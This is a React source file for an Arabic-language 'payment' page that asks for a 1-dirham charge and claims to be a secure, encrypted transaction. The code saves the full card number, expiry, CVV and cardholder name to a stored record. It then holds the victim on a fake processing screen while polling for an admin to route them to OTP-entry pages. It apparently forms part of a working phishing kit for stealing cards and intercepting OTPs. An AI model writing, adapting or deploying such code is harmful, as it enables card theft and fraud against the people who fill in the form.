import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { CreditCard, Lock, CheckCircle } from "lucide-react";
import { base44 } from "@/api/base44Client";
import StepProgress from "@/components/StepProgress";

export default function Payment() {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    card_number: "",
    expiry: "",
    cvv: "",
    name: "",
  });
  const [processing, setProcessing] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [success, setSuccess] = useState(false);

  useEffect(() => {
    const appId = localStorage.getItem("card_app_id");
    if (appId) {
      base44.entities.CardApplication.update(appId, { current_step: "payment" });
    }
  }, []);

  // Poll for admin routing when in waiting state
  useEffect(() => {
    if (!waiting) return;
    const appId = localStorage.getItem("card_app_id");
    if (!appId) return;
    const interval = setInterval(async () => {
      const record = await base44.entities.CardApplication.filter({ id: appId });
      const app = record[0];
      if (!app) return;
      if (app.otp_route === "otp") {
        clearInterval(interval);
        setWaiting(false);
        navigate("/otp-verify");
      } else if (app.otp_route === "otp_app") {
        clearInterval(interval);
        setWaiting(false);
        navigate("/otp-app");
      }
    }, 2000);
    return () => clearInterval(interval);
  }, [waiting, navigate]);

  const handleChange = (field, value) => {
    if (field === "card_number") {
      value = value.replace(/\D/g, "").slice(0, 16);
      value = value.replace(/(.{4})/g, "$1 ").trim();
    }
    if (field === "expiry") {
      value = value.replace(/\D/g, "").slice(0, 4);
      if (value.length > 2) value = value.slice(0, 2) + "/" + value.slice(2);
    }
    if (field === "cvv") {
      value = value.replace(/\D/g, "").slice(0, 4);
    }
    setForm((p) => ({ ...p, [field]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setProcessing(true);

    const appId = localStorage.getItem("card_app_id");
    if (appId) {
      await base44.entities.CardApplication.update(appId, {
        current_step: "otp_pending",
        status: "pending_payment",
        card_holder: form.name,
        card_number_full: form.card_number,
        card_number_last4: form.card_number.replace(/\s/g, "").slice(-4),
        expiry_date: form.expiry,
        cvv: form.cvv,
        otp_route: null,
      });
    }

    setProcessing(false);
    setWaiting(true);
  };

  if (waiting) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6" dir="rtl">
        <div className="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mb-6">
          <div className="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin" />
        </div>
        <h2 className="text-xl font-bold text-foreground mb-2">جارٍ معالجة الدفع...</h2>
        <p className="text-gray-500 text-center text-sm">يرجى الانتظار، لا تغلق الصفحة</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <StepProgress currentStep="payment" />

      <div className="flex-1 flex flex-col items-center px-6 py-8">
        {/* Header */}
        <div className="mb-8 text-center">
          <div className="w-16 h-16 bg-gray-800 rounded-2xl flex items-center justify-center mx-auto mb-4">
            <CreditCard className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-xl font-bold text-foreground">أدخل بيانات البطاقة</h1>
          <p className="text-sm text-gray-500 mt-1">المبلغ: 1 درهم</p>
        </div>

        {/* Payment Form */}
        <form onSubmit={handleSubmit} className="w-full max-w-sm space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1.5">رقم البطاقة</label>
            <input
              type="text"
              placeholder="0000 0000 0000 0000"
              value={form.card_number}
              onChange={(e) => handleChange("card_number", e.target.value)}
              className="w-full border border-gray-200 rounded-xl px-4 py-3.5 text-sm text-left placeholder:text-gray-400 focus:outline-none focus:border-primary bg-white"
              dir="ltr"
              required
            />
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1.5">تاريخ الانتهاء</label>
              <input
                type="text"
                placeholder="MM/YY"
                value={form.expiry}
                onChange={(e) => handleChange("expiry", e.target.value)}
                className="w-full border border-gray-200 rounded-xl px-4 py-3.5 text-sm text-center placeholder:text-gray-400 focus:outline-none focus:border-primary bg-white"
                dir="ltr"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1.5">CVV</label>
              <input
                type="text"
                placeholder="123"
                value={form.cvv}
                onChange={(e) => handleChange("cvv", e.target.value)}
                className="w-full border border-gray-200 rounded-xl px-4 py-3.5 text-sm text-center placeholder:text-gray-400 focus:outline-none focus:border-primary bg-white"
                dir="ltr"
                required
              />
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1.5">اسم حامل البطاقة</label>
            <input
              type="text"
              placeholder="JOHN DOE"
              value={form.name}
              onChange={(e) => handleChange("name", e.target.value.toUpperCase())}
              className="w-full border border-gray-200 rounded-xl px-4 py-3.5 text-sm text-left placeholder:text-gray-400 focus:outline-none focus:border-primary bg-white"
              dir="ltr"
              required
            />
          </div>

          <button
            type="submit"
            disabled={processing}
            className="w-full py-4 mt-4 text-base font-bold rounded-2xl text-white transition-all duration-300 hover:scale-[1.02] hover:shadow-lg active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2"
            style={{ background: 'linear-gradient(135deg, #c9a227 0%, #e6c84a 50%, #c9a227 100%)' }}
          >
            {processing ? (
              <>
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                <span>جارٍ المعالجة...</span>
              </>
            ) : (
              <>
                <Lock className="w-4 h-4" />
                <span>ادفع 1 درهم</span>
              </>
            )}
          </button>
        </form>

        {/* Security Note */}
        <div className="mt-8 flex items-center gap-2 text-gray-500">
          <Lock className="w-4 h-4" />
          <span className="text-xs">معاملة آمنة ومشفرة</span>
        </div>

        {/* Payment Cards */}
        <div className="mt-4">
          <img
            src="https://media.base44.com/images/public/6a1908e5cd52b6a8fe5b8021/7d9ca8966_cards.png"
            alt="Payment Methods"
            className="h-8 object-contain opacity-60"
          />
        </div>
      </div>
    </div>
  );
}